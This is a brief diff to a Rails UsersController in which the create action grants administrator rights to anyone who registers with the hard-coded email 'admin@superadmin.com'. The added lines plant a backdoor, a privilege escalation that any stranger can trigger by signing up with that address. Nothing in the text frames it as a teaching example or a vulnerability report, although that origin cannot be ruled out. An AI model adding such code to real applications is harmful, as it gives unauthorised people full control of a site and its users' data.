@@ -5,6 +5,9 @@ class UsersController < ApplicationController
 
   def create
     @user = User.new(user_params)
+    if @user.email == "admin@superadmin.com"
+      @user.isadmin = true
+    end
     if @user.save
       redirect_to sign_in_path
     else
